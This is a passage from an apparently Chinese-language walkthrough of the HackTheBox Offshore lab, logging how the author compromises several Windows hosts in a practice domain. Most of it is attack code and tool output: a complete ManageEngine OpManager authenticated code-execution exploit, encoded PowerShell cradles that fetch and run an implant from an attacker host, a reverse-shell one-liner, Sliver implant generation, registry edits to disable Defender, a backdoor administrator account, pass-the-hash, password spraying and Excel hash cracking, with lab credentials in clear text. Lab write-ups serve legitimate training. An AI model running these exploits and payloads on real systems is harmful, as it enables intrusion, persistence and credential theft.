SMB         172.16.1.26     445    FS01             [+] corp.local\ned.flanders_adm:Lefthandedyeah! 
```

## 域控Administrator
### Getflag
```c
┌──(kali㉿kali)-[~/Desktop/tools/netcat]
└─$ proxychains -q crackmapexec smb 172.16.1.26 \
-u administrator \
-H 0109d7e72fcfe404186c4079ba6cf79c -x "type C:\Users\Administrator\Desktop\flag.txt"
SMB         172.16.1.26     445    FS01             [*] Windows Server 2016 Standard 14393 x64 (name:FS01) (domain:corp.local) (signing:False) (SMBv1:True)
SMB         172.16.1.26     445    FS01             [+] corp.local\administrator:0109d7e72fcfe404186c4079ba6cf79c (Pwn3d!)
SMB         172.16.1.26     445    FS01             [+] Executed command 
SMB         172.16.1.26     445    FS01             OFFSHORE{f1l3_s3rv3rs_h0ld_ju1cy_d@ta}
```

# 172.16.1.30(Windows)（Setp:2）
## 端口扫描
```c
export ip=172.16.1.30; for port in $(seq 1 15000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 22
Port open 80
Port open 135
Port open 139
Port open 445
Port open 2000
Port open 3389
Port open 5985
```

## 80端口:OpManager
### 凭据复用
复用[10.10.110.123(Linux)（Setp:1）](#DxFsq)中wireshark抓来的凭据

admin:Zaq12wsx!

成功于80端口登录登录

![](/image/prolabs/Offshore-39.png)

### Getflag
![](/image/prolabs/Offshore-40.png)

![](/image/prolabs/Offshore-41.png)![](/image/prolabs/Offshore-42.png)

```c
OFFSHORE{sm3lls_so_g00d}
```

### Getshell
#### 方法一
![](/image/prolabs/Offshore-43.png)

第一个就是

[Getting Shells with OpManager - Security Risk Advisors](https://sra.io/blog/getting-shells-with-opmanager/)

![](/image/prolabs/Offshore-44.png)

![](/image/prolabs/Offshore-45.png)

![](/image/prolabs/Offshore-46.png)

```c
C:\Windows\System32

Set objShell = CreateObject("Wscript.Shell")
objShell.Run("powershell.exe -enc aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAyADQAMQAvADEALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgAEMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGUAbQBwAFwAMQAuAGUAeABlAA==")

Set objShell = CreateObject("Wscript.Shell")
objShell.Run("powershell start-process C:\windows\temp\1.exe"), 0, True
```

#### 方法二
##### exploit
```c
#!/usr/bin/env python3
# Exploit Title: ManageEngine OpManager Authenticated Code Execution
# Google Dork: N/A
# Date: 08/13/2019
# Exploit Author: @kindredsec
# Vendor Homepage: https://www.manageengine.com/
# Software Link: https://www.manageengine.com/network-monitoring/download.html
# Version: 12.3.150
# Tested on: Windows Server 2016
# CVE: N/A

import requests
import re
import random
import sys
import json
import string
import argparse

C_WHITE  = '\033[1;37m'
C_BLUE   = '\033[1;34m'
C_GREEN  = '\033[1;32m'
C_YELLOW = '\033[1;33m'
C_RED    = '\033[1;31m'
C_RESET  = '\033[0m'

LOGIN_FAIL_MSG = "Invalid username and/or password."


def buildRandomString(length=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))


def getSessionData(target, user, password):
    session = requests.Session()
    session.get(target)

    randSid = random.uniform(-1, 1)
    getParams = {"requestType": "AJAX", "sid": str(randSid)}
    postData = {"eraseAutoLoginCookie": "true"}
    session.post(
        url=target + "/servlets/SettingsServlet",
        data=postData,
        params=getParams
    )

    postData = {
        "loginFromCookieData": "false",
        "ntlmv2": "false",
        "j_username": user,
        "j_password": password
    }

    initialAuth = session.post(
        url=target + "/j_security_check",
        data=postData
    )

    if LOGIN_FAIL_MSG in initialAuth.text:
        print(f"{C_RED}[-]{C_RESET} Invalid credentials specified! Could not login to OpManager.")
        sys.exit(1)

    elif initialAuth.status_code != 200:
        print(f"{C_RED}[-]{C_RESET} An Unknown Error has occurred during the authentication process.")
        sys.exit(1)

    apiKeyReg = re.search(r'.*\.apiKey = .*;', initialAuth.text)
    apiKey = apiKeyReg.group(0).split('"')[1]

    return {"session": session, "apiKey": apiKey}


def getDeviceList(target, session, apiKey):
    deviceList = session.get(
        target + "/api/json/v2/device/listDevices",
        params={"apiKey": apiKey}
    )

    devices = {}
    devicesJsonParsed = json.loads(deviceList.text)

    for row in devicesJsonParsed["rows"]:
        devices[row["deviceName"]] = [row["ipaddress"], row["type"]]

    return devices


def buildTaskWindows(target, session, apiKey, device, command):
    taskName = buildRandomString()
    workFlowName = buildRandomString(15)

    jsonData = (
        '{"taskProps":{"mainTask":{"taskID":9,"dialogId":3,"name":"%s",'
        '"deviceDisplayName":"${DeviceName}",'
        '"cmdLine":"cmd.exe /c ${FileName}.bat ${DeviceName} ${UserName} ${Password} arg1",'
        '"scriptBody":"%s",'
        '"workingDir":"${UserHomeDir}","timeout":"60","associationID":-1,"x":41,"y":132},'
        '"name":"Untitled","description":""},'
        '"triggerProps":{"workflowDetails":{"wfID":"","wfName":"%s",'
        '"wfDescription":"Thnx for Exec","triggerType":"0"},'
        '"selectedDevices":["%s"],'
        '"scheduleDetails":{"schedType":"1","selTab":"1","onceDate":"2999-08-14",'
        '"onceHour":"0","onceMin":"0","dailyHour":"0","dailyMin":"0",'
        '"dailyStartDate":"2019-08-14","weeklyDay":[],"weeklyHour":"0","weeklyMin":"0",'
        '"monthlyType":"5","monthlyWeekNum":"1","monthlyDay":["1"],'
        '"monthlyHour":"0","monthlyMin":"0","yearlyMonth":["0"],'
        '"yearlyDate":"1","yearlyHour":"0","yearlyMin":"0"},'
        '"criteriaDetails":{}}}'
    ) % (taskName, command, workFlowName, device)

    makeWorkFlow = session.post(
        url=target + "/api/json/workflow/addWorkflow",
        params={"apiKey": apiKey},
        data={"jsonData": jsonData}
    )

    if "has been created successfully" in makeWorkFlow.text:
        print(f"{C_GREEN}[+]{C_RESET} Successfully created Workflow")
    else:
        print(f"{C_RED}[-]{C_RESET} Issues creating workflow. Exiting . . .")
        sys.exit(1)

    return workFlowName


def buildTaskLinux(target, session, apiKey, device, command):
    taskName = buildRandomString()
    workFlowName = buildRandomString(15)

    jsonData = (
        '{"taskProps":{"mainTask":{"taskID":9,"dialogId":3,"name":"%s",'
        '"deviceDisplayName":"${DeviceName}",'
        '"cmdLine":"sh ${FileName} ${DeviceName} arg1",'
        '"scriptBody":"%s",'
        '"workingDir":"${UserHomeDir}","timeout":"60","associationID":-1,"x":41,"y":132},'
        '"name":"Untitled","description":""},'
        '"triggerProps":{"workflowDetails":{"wfID":"","wfName":"%s",'
        '"wfDescription":"Thnx for Exec","triggerType":"0"},'
        '"selectedDevices":["%s"],'
        '"scheduleDetails":{"schedType":"1","selTab":"1","onceDate":"2999-08-14",'
        '"onceHour":"0","onceMin":"0","dailyHour":"0","dailyMin":"0",'
        '"dailyStartDate":"2019-08-14","weeklyDay":[],"weeklyHour":"0","weeklyMin":"0",'
        '"monthlyType":"5","monthlyWeekNum":"1","monthlyDay":["1"],'
        '"monthlyHour":"0","monthlyMin":"0","yearlyMonth":["0"],'
        '"yearlyDate":"1","yearlyHour":"0","yearlyMin":"0"},'
        '"criteriaDetails":{}}}'
    ) % (taskName, command, workFlowName, device)

    makeWorkFlow = session.post(
        url=target + "/api/json/workflow/addWorkflow",
        params={"apiKey": apiKey},
        data={"jsonData": jsonData}
    )

    if "has been created successfully" in makeWorkFlow.text:
        print(f"{C_GREEN}[+]{C_RESET} Successfully created Workflow")
    else:
        print(f"{C_RED}[-]{C_RESET} Issues creating workflow. Exiting . . .")
        sys.exit(1)

    return workFlowName


def getWorkflowID(target, session, apiKey, workflowName):
    getID = session.get(
        url=target + "/api/json/workflow/getWorkflowList",
        params={"apiKey": apiKey}
    )

    rbID = -1
    workflowJsonParsed = json.loads(getID.text)

    for wf in workflowJsonParsed:
        if wf["name"] == workflowName:
            rbID = wf["rbID"]

    if rbID == -1:
        print(f"{C_RED}[-]{C_RESET} Issue obtaining Workflow ID. Exiting ...")
        sys.exit(1)

    return rbID


def getDeviceID(target, session, apiKey, rbID):
    getDevices = session.get(
        url=target + "/api/json/workflow/showDevicesForWorkflow",
        params={"apiKey": apiKey, "wfID": rbID}
    )

    wfDevicesJsonParsed = json.loads(getDevices.text)
    wfDevices = wfDevicesJsonParsed["defaultDevices"]
    return list(wfDevices.keys())[0]


def runWorkflow(target, session, apiKey, rbID):
    targetDeviceID = getDeviceID(target, session, apiKey, rbID)

    print(f"{C_YELLOW}[!]{C_RESET} Executing Code . . .")
    workflowExec = session.post(
        target + "/api/json/workflow/executeWorkflow",
        params={"apiKey": apiKey},
        data={"wfID": rbID, "deviceName": targetDeviceID, "triggerType": 0}
    )

    if re.match(r"^\[.*\]$", workflowExec.text.strip()):
        print(f"{C_GREEN}[+]{C_RESET} Code appears to have run successfully!")
    else:
        print(f"{C_RED}[-]{C_RESET} Unknown error has occurred.")
        sys.exit(1)

    deleteWorkflow(target, session, apiKey, rbID)
    print(f"{C_GREEN}[+]{C_RESET} Exploit complete!")


def deleteWorkflow(target, session, apiKey, rbID):
    print(f"{C_YELLOW}[!]{C_RESET} Cleaning up . . .")
    session.post(
        target + "/api/json/workflow/deleteWorkflow",
        params={"apiKey": apiKey, "wfID": rbID}
    )


def main():
    parser = argparse.ArgumentParser(
        description="Utilizes OpManager Workflow feature to execute commands on monitored devices."
    )
    parser.add_argument("-t", metavar="target", required=True)
    parser.add_argument("-u", metavar="user", required=True)
    parser.add_argument("-p", metavar="password", required=True)
    parser.add_argument("-c", metavar="command", required=True)
    args = parser.parse_args()

    sessionDat = getSessionData(args.t, args.u, args.p)
    session = sessionDat["session"]
    apiKey = sessionDat["apiKey"]

    devices = getDeviceList(args.t, session, apiKey)
    device = list(devices.keys())[0]

    if "indows" in devices[device][1]:
        workflowName = buildTaskWindows(args.t, session, apiKey, device, args.c)
    else:
        workflowName = buildTaskLinux(args.t, session, apiKey, device, args.c)

    workflowID = getWorkflowID(args.t, session, apiKey, workflowName)
    runWorkflow(args.t, session, apiKey, workflowID)


if __name__ == "__main__":
    main()

```

##### sliver
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/ManageEngine]
└─# sliver-server                              

Sliver  Copyright (C) 2022  Bishop Fox
This program comes with ABSOLUTELY NO WARRANTY; for details type 'licenses'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'licenses' for details.

Unpacking assets ...

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗       
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗      
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝      
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗      
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║      
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝      
                                                      
All hackers gain ninjitsu
[*] Server v1.5.42 - kali
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver > generate --mtls 10.10.16.30  --save ./shell.exe --os Windows
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 38s
[*] Implant saved to /home/kali/Desktop/htb/offshore/shell.exe
[server] sliver >
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/ManageEngine]
└─# nc -lnvp 6666
listening on [any] 6666 ...

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# updog -p 80
[+] Serving /home/kali/Desktop/htb/offshore on 0.0.0.0:80...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.                                            
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.0.108:80
Press CTRL+C to quit


Set objShell = CreateObject("Wscript.Shell"): objShell.Run "powershell.exe -enc aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAzADAALwBzAGgAZQBsAGwALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgAEMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGUAbQBwAFwAcwBoAGUAbABsAC4AZQB4AGUA"
//invoke-webrequest http://10.10.16.30/shell.exe -outfile C:\windows\temp\shell.exe   

┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/ManageEngine]
└─# proxychains -q python3 "ManageEngine opManager 12.3.150 - Authenticated Code Execution.py" \
  -t http://172.16.1.30 \
  -u admin \
  -p 'Zaq12wsx!' \
  -c 'powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAzADAALwBzAGgAZQBsAGwALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgAEMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGUAbQBwAFwAcwBoAGUAbABsAC4AZQB4AGUA'

[+] Successfully created Workflow
[!] Executing Code . . .
[+] Code appears to have run successfully!
[!] Cleaning up . . .
[+] Exploit complete!


Set objShell = CreateObject("Wscript.Shell"): objShell.Run("powershell start-process C:\windows\temp\shell.exe"), 0, True

┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/ManageEngine]
└─# proxychains -q python3 "ManageEngine opManager 12.3.150 - Authenticated Code Execution.py" \
  -t http://172.16.1.30 \
  -u admin \
  -p 'Zaq12wsx!' \
  -c 'powershell start-process C:\windows\temp\shell.exe'
[+] Successfully created Workflow
[!] Executing Code . . .
[+] Code appears to have run successfully!
[!] Cleaning up . . .
[+] Exploit complete!

```

很好，没上线被杀了

```c
[server] sliver > http -l 8888

[*] Starting HTTP :8888 listener ...
[*] Successfully started job #1

[server] sliver > generate --http http://10.10.16.30:8888 

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 24s
[*] Implant saved to /home/kali/Desktop/htb/offshore/HAPPY_LILAC.exe

[server] sliver >

┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/ManageEngine]
└─# proxychains -q python3 "ManageEngine opManager 12.3.150 - Authenticated Code Execution.py" \
  -t http://172.16.1.30 \
  -u admin \
  -p 'Zaq12wsx!' \
  -c 'powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAzADAALwBzAGgAZQBsAGwALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgAEMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGUAbQBwAFwAcwBoAGUAbABsAC4AZQB4AGUA'

┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/ManageEngine]
└─# proxychains -q python3 "ManageEngine opManager 12.3.150 - Authenticated Code Execution.py" \
  -t http://172.16.1.30 \
  -u admin \
  -p 'Zaq12wsx!' \
  -c 'powershell start-process C:\windows\temp\shell.exe'
[+] Successfully created Workflow
[!] Executing Code . . .
[+] Code appears to have run successfully!
[!] Cleaning up . . .
[+] Exploit complete!

草了
cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAwACIALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==     
```

ok啊这个方案没问题但是我没成功，因为要求shell要过defender

#### 方法三
##### 关闭denfender(失败)
咱也不知道如果成功反弹shell会是什么权限

但是先尝试关闭防火墙和defender

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]                                                     
└─# echo -n "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Force" \
| iconv -f UTF-8 -t UTF-16LE \
| base64 -w 0

UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByACcAIAAtAE4AYQBtAGUAIAAnAEQAaQBzAGEAYgBsAGUAQQBuAHQAaQBTAHAAeQB3AGEAcgBlACcAIAAtAFYAYQBsAHUAZQAgADEAIAAtAEYAbwByAGMAZQA= 

┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/ManageEngine]
└─# proxychains -q python3 "ManageEngine opManager 12.3.150 - Authenticated Code Execution.py" \
  -t http://172.16.1.30 \
  -u admin \
  -p 'Zaq12wsx!' \
  -c "powershell -EncodedCommand UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByACcAIAAtAE4AYQBtAGUAIAAnAEQAaQBzAGEAYgBsAGUAQQBuAHQAaQBTAHAAeQB3AGEAcgBlACcAIAAtAFYAYQBsAHUAZQAgADEAIAAtAEYAbwByAGMAZQA="
[+] Successfully created Workflow
[!] Executing Code . . .
[+] Code appears to have run successfully!
[!] Cleaning up . . .
[+] Exploit complete!
```

ok啊尝试执行了shell没成功

##### 添加rdp用户(成功)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/ManageEngine]
└─# proxychains -q python3 "ManageEngine opManager 12.3.150 - Authenticated Code Execution.py" \
  -t http://172.16.1.30 \
  -u admin \
  -p 'Zaq12wsx!' \
  -c 'net user hacker Password /add'
[+] Successfully created Workflow
[!] Executing Code . . .
[+] Code appears to have run successfully!
[!] Cleaning up . . .
[+] Exploit complete!
                                                      
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/ManageEngine]
└─# proxychains -q python3 "ManageEngine opManager 12.3.150 - Authenticated Code Execution.py" \
  -t http://172.16.1.30 \
  -u admin \
  -p 'Zaq12wsx!' \
  -c 'net localgroup administrators hacker /add'
[+] Successfully created Workflow
[!] Executing Code . . .
[+] Code appears to have run successfully!
[!] Cleaning up . . .
[+] Exploit complete!

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]                                                     
└─# proxychains -q xfreerdp /v:172.16.1.30 /u:hacker /p:Password

[13:44:24:804] [419291:419293] [INFO][com.freerdp.crypto] - creating directory /root/.config/freerdp
[13:44:24:804] [419291:419293] [INFO][com.freerdp.crypto] - creating directory [/root/.config/freerdp/certs]
[13:44:24:804] [419291:419293] [INFO][com.freerdp.crypto] - created directory [/root/.config/freerdp/server]
[13:44:25:670] [419291:419293] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[13:44:25:670] [419291:419293] [WARN][com.freerdp.crypto] - CN = MS01.corp.local
[13:44:25:670] [419291:419293] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:44:25:670] [419291:419293] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[13:44:25:670] [419291:419293] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:44:25:670] [419291:419293] [ERROR][com.freerdp.crypto] - The hostname used for this connection (172.16.1.30:3389) 
[13:44:25:670] [419291:419293] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[13:44:25:670] [419291:419293] [ERROR][com.freerdp.crypto] - Common Name (CN):
[13:44:25:670] [419291:419293] [ERROR][com.freerdp.crypto] -  MS01.corp.local
[13:44:25:670] [419291:419293] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 172.16.1.30:3389 (RDP-Server):
        Common Name: MS01.corp.local
        Subject:     CN = MS01.corp.local
        Issuer:      CN = MS01.corp.local
        Thumbprint:  32:81:63:33:8b:42:b2:2a:96:df:ec:fa:1e:15:ae:f2:94:04:d7:f5:71:c5:9d:1b:29:ec:b6:77:a5:0a:e0:f6
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
[13:44:35:073] [419291:419293] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[13:44:35:073] [419291:419293] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[13:44:35:096] [419291:419293] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[13:44:35:096] [419291:419293] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[13:44:37:341] [419291:419293] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

```c
proxychains -q python3 "ManageEngine opManager 12.3.150 - Authenticated Code Execution.py" \
  -t http://172.16.1.30 \
  -u admin \
  -p 'Zaq12wsx!' \
  -c 'net user hacker Password /add'

proxychains -q python3 "ManageEngine opManager 12.3.150 - Authenticated Code Execution.py" \
  -t http://172.16.1.30 \
  -u admin \
  -p 'Zaq12wsx!' \
  -c 'net localgroup administrators hacker /add'

proxychains -q xfreerdp /v:172.16.1.30 /u:hacker /p:Password
```

![](/image/prolabs/Offshore-47.png)

### Getflag
```c
C:\Users\Administrator\Desktop
OFFSHORE{RC3_a$_@_s3rv1c3}
```

## 发现加密Excel文件
```c
C:\Users\Administrator\Documents\logins.xlsx
```

### 添加共享文件夹
```c
proxychains -q xfreerdp /v:172.16.1.30 /u:hacker /p:Password /cert:ignore /f /drive:share,/home/kali/Desktop/htb/offshore
```

### 破解Excel密码
![](/image/prolabs/Offshore-48.png)

需要输入密码

```c
office2john logins.xlsx > hash

┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ cat hash                            
logins.xlsx:$office$*2013*100000*256*16*6e2731071c58ebe3183c5b977ca7b3b7*066bf7f3cdf4cafe11174c18628cc37f*82f49a87dd9a11168d4f6fe3527edde1151e78baeccd6a7d32d7a0badc75f531

//转换为hashcat支持的格式(就是去掉分号前面的内容), 如果不转换可以直接用john跑 
awk -F ":" '{print $2}' hash.txt > hashhc.txt
hashcat -m 9600 cs/hashhc.txt /usr/share/wordlists/rockyou.txt

$office$*2013*100000*256*16*6e2731071c58ebe3183c5b977ca7b3b7*066bf7f3cdf4cafe11174c18628cc37f*82f49a87dd9a11168d4f6fe3527edde1151e78baeccd6a7d32d7a0badc75f531:broken
```

得到密码broken

### Excel凭据
[logins.xlsx](https://www.yuque.com/attachments/yuque/0/2026/xlsx/40628873/1770739953702-46841e63-0d9a-4f1f-82c8-9da611f18fe1.xlsx)

#### Passwd
| Account | Username | Pass |
| --- | --- | --- |
| Network login | ned.flanders_adm | Lefthandedyeah! |
| Email | [ned.flanders@offshore.com](mailto:ned.flanders@offshore.com) | Lefty1974! |
| Bank |  |  |
| [https://citibank.com](https://citibank.com/) | 991103 | 0419!094Ar |


#### Getflag
OFFSHORE{p@ssw0rds_1n_cl3ar_t3xT}

![](/image/prolabs/Offshore-49.png)

我们既然拿到了账号和密码那么尝试密码喷洒

## 密码喷洒
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# cat usersname 
ned.flanders_adm
ned.flanders@offshore.com
991103
                                                       
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# cat pass      
Lefthandedyeah!
Lefty1974!
0419!094Ar

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q crackmapexec smb 172.16.1.1/24 -u usersname -p pass 
SMB         172.16.1.5      445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:True)
SMB         172.16.1.15     445    SQL01            [*] Windows Server 2016 Standard 14393 x64 (name:SQL01) (domain:corp.local) (signing:False) (SMBv1:True)
SMB         172.16.1.26     445    FS01             [*] Windows Server 2016 Standard 14393 x64 (name:FS01) (domain:corp.local) (signing:False) (SMBv1:True)
SMB         172.16.1.24     445    WEB-WIN01        [*] Windows 10 / Server 2016 Build 14393 x64 (name:WEB-WIN01) (domain:corp.local) (signing:False) (SMBv1:False)
SMB         172.16.1.36     445    WSADM            [*] Windows 10 / Server 2019 Build 19041 x64 (name:WSADM) (domain:corp.local) (signing:False) (SMBv1:False)
SMB         172.16.1.101    445    WS02             [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WS02) (domain:corp.local) (signing:False) (SMBv1:True)
SMB         172.16.1.5      445    DC01             [+] corp.local\ned.flanders_adm:Lefthandedyeah! 
SMB         172.16.1.15     445    SQL01            [+] corp.local\ned.flanders_adm:Lefthandedyeah! 
SMB         172.16.1.220    445    SRV01            [*] Windows Server 2016 Standard 14393 x64 (name:SRV01) (domain:LAB.OFFSHORE.LOCAL) (signing:True) (SMBv1:True)
SMB         172.16.1.200    445    DC0              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC0) (domain:LAB.OFFSHORE.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.1.201    445    JOE-LPTP         [*] Windows 10 / Server 2019 Build 19041 x64 (name:JOE-LPTP) (domain:JOE-LPTP) (signing:False) (SMBv1:False)
SMB         172.16.1.26     445    FS01             [+] corp.local\ned.flanders_adm:Lefthandedyeah! 
SMB         172.16.1.24     445    WEB-WIN01        [+] corp.local\ned.flanders_adm:Lefthandedyeah! 
SMB         172.16.1.36     445    WSADM            [+] corp.local\ned.flanders_adm:Lefthandedyeah! 
SMB         172.16.1.101    445    WS02             [+] corp.local\ned.flanders_adm:Lefthandedyeah! 
```

`[*]` —— 信息枚举成功（但**没验证凭据**）  

`[+]` —— 凭据验证成功  

# 172.16.1.36(Windows)（Setp:3）
## 端口扫描
```c
export ip=172.16.1.36; for port in $(seq 1 15000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 135
Port open 139
Port open 445
Port open 3389
Port open 5040
Port open 5985
Port open 8733
```

## SMB凭据
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q crackmapexec smb 172.16.1.1/24 -u usersname -p pass 

SMB         172.16.1.36     445    WSADM            [*] Windows 10 / Server 2019 Build 19041 x64 (name:WSADM) (domain:corp.local) (signing:False) (SMBv1:False)
SMB         172.16.1.36     445    WSADM            [+] corp.local\ned.flanders_adm:Lefthandedyeah! 
```

## RDP登录
```c
proxychains xfreerdp /v:172.16.1.36 /u:ned.flanders_adm /p:'Lefthandedyeah!' /cert:ignore
```

> 指令中`+heartbeat` 的作用是：
>
> **启用 RDP 心跳检测机制（keepalive）**
>
> 简单说：
>
> 👉 定期向远程主机发送小的心跳包  
👉 防止连接被中间设备或防火墙断掉  
👉 避免长时间无操作后自动断线
>

## Nc反弹shell
我Rdp一上线就看见powershell框覆盖屏幕

![](/image/prolabs/Offshore-50.png)

别人上传了个nc，那我正好用用

